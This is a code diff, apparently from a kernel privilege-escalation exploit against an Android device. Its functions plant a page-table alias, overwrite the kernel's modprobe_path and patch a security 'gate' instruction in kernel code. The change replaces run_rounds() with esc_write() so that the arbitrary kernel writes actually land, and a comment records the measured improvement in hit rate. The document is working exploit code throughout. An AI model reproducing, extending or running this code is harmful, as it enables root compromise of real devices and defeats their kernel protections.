@@ -1114,13 +1114,18 @@ int esc_sugate7_open(char *out, int cap)
     el(&e, "sugate7-open in-process read of modprobe_path: %s",
        n > 0 ? cur : "unreadable by this uid -- the caller must witness through a root channel");
 
-    rc = run_rounds(SUGATE7_PGD_ENTRY, desc, sizeof desc, r, 0);
+    /* Through esc_write(), never run_rounds(): the file-scope SAFEFED defaults to 1, and
+     * clobber_data() refuses that shape on this device ("offset unmeasured"), so every
+     * round silently missed while the ladder reported a plain rc=0 -- measured 2026-11-10
+     * from adb shell: the same address/bytes hit 4/4 via esc_write (SAFEFED=0) and 0/24 via
+     * run_rounds (SAFEFED=1), which is why every boot chain so far left the gate in place. */
+    rc = esc_write(SUGATE7_PGD_ENTRY, desc, sizeof desc, r);
     el(&e, "sugate7-open alias entry addr=%#lx rounds=%d rc=%d", (unsigned long)SUGATE7_PGD_ENTRY, r, rc);
     if (rc != 1) {
         el(&e, "sugate7-open stop: the alias was not planted, nothing else was written");
         return -1;
     }
-    rc = run_rounds(mod_alias, SUGATE7_WITNESS, sizeof SUGATE7_WITNESS, r, 0);
+    rc = esc_write(mod_alias, SUGATE7_WITNESS, sizeof SUGATE7_WITNESS, r);
     el(&e, "sugate7-open witness write addr=%#lx (=%#lx through the alias) rounds=%d rc=%d",
        mod_alias, SUGATE7_MODPROBE_VA, r, rc);
     el(&e, "sugate7-open done: caller must read /proc/sys/kernel/modprobe as root, it must be \""
@@ -1162,7 +1167,7 @@ int esc_sugate7_restore(const char *orig, char *out, int cap)
         return n;
     }
     mod_alias = sugate_alias(SUGATE7_MODPROBE_VA);
-    rc = run_rounds(mod_alias, img, sizeof img, r, 0);
+    rc = esc_write(mod_alias, img, sizeof img, r);
     el(&e, "sugate7-restore write \"%s\" as the full %d-byte modprobe_path addr=%#lx rounds=%d rc=%d",
        orig, (int)sizeof img, mod_alias, r, rc);
     return rc == 1 ? 0 : -3;
@@ -1179,11 +1184,11 @@ int esc_sugate7_patch(char *out, int cap)
     gate_alias = sugate_alias(SUGATE7_GATE_VA);
     put_le(patchw, SUGATE7_GATE_PATCH, 4);
     put_le(origw, SUGATE7_GATE_ORIG, 4);
-    rc = run_rounds(gate_alias, patchw, sizeof patchw, r, 0);
+    rc = esc_write(gate_alias, patchw, sizeof patchw, r);
     el(&e, "sugate7-patch addr=%#lx (=%#lx via alias) rounds=%d rc=%d", gate_alias,
        (unsigned long)SUGATE7_GATE_VA, r, rc);
     if (rc != 1) {
-        back = run_rounds(gate_alias, origw, sizeof origw, r, 0);
+        back = esc_write(gate_alias, origw, sizeof origw, r);
         el(&e, "sugate7-patch missed, rollback rc=%d", back);
         return back == 1 ? -3 : -4;
     }
@@ -1208,7 +1213,7 @@ int esc_sugate7_abort(const char *orig, char *out, int cap)
                "exactly as the witness write left it", orig == NULL ? "" : orig, n);
         return n;
     }
-    rc = run_rounds(SUGATE7_MODPROBE_VA, img, sizeof img, r, 0);
+    rc = esc_write(SUGATE7_MODPROBE_VA, img, sizeof img, r);
     el(&e, "sugate7-abort restore \"%s\" at the REAL VA (not the alias -- that is what failed) rc=%d; "
            "no .text was written", orig, rc);
     return rc == 1 ? 0 : -3;
@@ -1221,7 +1226,7 @@ int esc_sugate7_revert(char *out, int cap)
     int rc;
 
     put_le(origw, SUGATE7_GATE_ORIG, 4);
-    rc = run_rounds(sugate_alias(SUGATE7_GATE_VA), origw, sizeof origw, 24, 0);
+    rc = esc_write(sugate_alias(SUGATE7_GATE_VA), origw, sizeof origw, 24);
     el(&e, "sugate7 revert rc=%d", rc);
     return rc == 1 ? 0 : -1;
 }
